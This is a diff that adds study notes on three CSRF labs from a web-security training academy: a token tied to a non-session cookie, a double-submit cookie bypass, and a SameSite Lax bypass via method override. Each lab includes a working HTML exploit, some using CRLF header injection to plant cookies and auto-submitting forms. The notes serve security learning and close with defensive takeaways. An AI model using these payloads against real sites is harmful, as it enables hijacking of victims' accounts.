@@ -117,3 +117,108 @@ Then I used the token in the exploit and delivered it to the victim.
 CSRF tokens must be tied to the user's session.
 
 A valid token from one account should not work in another user's session.
+
+## Lab 05: CSRF Where Token Is Tied to Non-Session Cookie
+
+This lab showed a CSRF weakness where the token was tied to a separate cookie called `csrfKey`, not to the user's session.
+
+The application accepted the request when:
+
+```text
+csrf token matches csrfKey cookie
+```
+
+But it did not properly check whether they belonged to the current logged-in user.
+
+The exploit used two parts:
+
+```text
+1. Set the victim's csrfKey cookie.
+2. Submit the email change form with the matching csrf token.
+```
+
+The exploit was:
+
+```html
+<form method="POST" action="https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email">
+    <input type="hidden" name="email" value="csrf-final-test@test.com">
+    <input type="hidden" name="csrf" value="PASTE-CSRF-TOKEN-HERE">
+</form>
+
+<img src="https://YOUR-LAB-ID.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrfKey=PASTE-CSRFKEY-HERE%3b%20SameSite=None" onerror="document.forms[0].submit();">
+```
+
+The image request planted the `csrfKey` cookie.
+
+Then `onerror` submitted the form automatically.
+
+### Key Takeaway
+
+A CSRF token should be tied to the user's session.
+
+If the token is only tied to a separate cookie, an attacker may be able to plant that cookie and reuse a valid token.
+
+## Lab 06: CSRF Where Token Is Duplicated in Cookie
+
+This lab showed a weakness in the double submit cookie CSRF defense.
+
+The application accepted the request when:
+
+```text
+csrf cookie value = csrf form value
+```
+
+The exploit used the same attacker-controlled value in both places:
+
+```text
+csrf=fake
+```
+
+The exploit was:
+
+```html
+<form method="POST" action="https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email">
+    <input type="hidden" name="email" value="csrf-duplicate-test@test.com">
+    <input type="hidden" name="csrf" value="fake">
+</form>
+
+<img src="https://YOUR-LAB-ID.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrf=fake%3b%20SameSite=None" onerror="document.forms[0].submit();">
+```
+
+The image request planted the `csrf=fake` cookie.
+
+Then `onerror` submitted the form with the same `csrf=fake` value.
+
+### Key Takeaway
+
+Double submit cookie protection is not safe if the attacker can set or control the CSRF cookie.
+
+A CSRF token should be tied to the user's session, not only compared with a cookie value.
+
+## Lab 07: SameSite Lax Bypass via Method Override
+
+This lab showed how SameSite Lax can be bypassed using method override.
+
+SameSite Lax blocks cookies on cross-site POST requests, but it allows cookies on top-level GET navigation.
+
+The exploit used:
+
+```html
+<script>
+    document.location = "https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email?email=victim-samesite%40test.com&_method=POST";
+</script>
+```
+
+The request was sent as a GET request, so the session cookie was included.
+
+Then the server used:
+
+```text
+_method=POST
+```
+
+and treated the request like a POST request.
+
+### Key Takeaway
+
+SameSite Lax is not enough if the application allows state-changing actions through GET requests or method override.
